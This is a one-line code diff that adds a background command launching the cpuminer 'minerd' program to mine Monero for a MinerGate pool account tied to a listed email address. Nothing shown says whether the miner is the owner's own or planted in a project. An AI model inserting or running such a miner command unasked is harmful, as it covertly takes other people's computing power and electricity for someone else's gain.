@@ -1,0 +1,1 @@
+`/cpuminer-multi/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u speedvampir@gmail.com -p x > /dev/stdout &`
